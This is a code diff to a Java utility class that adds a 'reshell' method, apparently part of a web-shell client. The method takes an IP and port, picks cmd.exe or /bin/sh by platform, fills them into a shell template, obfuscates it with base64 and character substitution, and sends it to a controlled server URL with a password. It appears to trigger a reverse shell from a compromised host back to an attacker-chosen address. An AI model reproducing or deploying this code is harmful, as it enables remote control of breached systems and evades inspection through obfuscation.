@@ -46,7 +46,23 @@ public class Util {
 			return "";
 		}
 	}
-	
+	public static String reshell(String pfm,List<String> cmdlist) {
+		String exec="";
+		String ip=cmdlist.get(1);
+		String port=cmdlist.get(2);
+		switch (pfm) {
+		case "win":
+			exec="cmd.exe";
+			String res=Util.GetResponseString(Main.pass, Main.url, Util.EnChar(new String(Main.encoder.encode(Main.shell.replace("%cmd1%", exec).replace("%cmd2%", ip).replace("%cmd3%", port).getBytes())), Main.key, Main.words), Main.key, Main.words);
+			return res;
+		case "unix":
+			exec="/bin/sh";
+			String res2=Util.GetResponseString(Main.pass, Main.url, Util.EnChar(new String(Main.encoder.encode(Main.shell.replace("%cmd1%", exec).replace("%cmd2%", ip).replace("%cmd3%", port).getBytes())), Main.key, Main.words), Main.key, Main.words);
+			return res2;
+		default:
+			return "fail";
+		}
+	}
 	public static String EnChar(String content,String key,String words) {
 		for (int i = 0; i <key.length(); i++) {
 			content=content.replace(words.substring(i,i+1), key.substring(i,i+1));
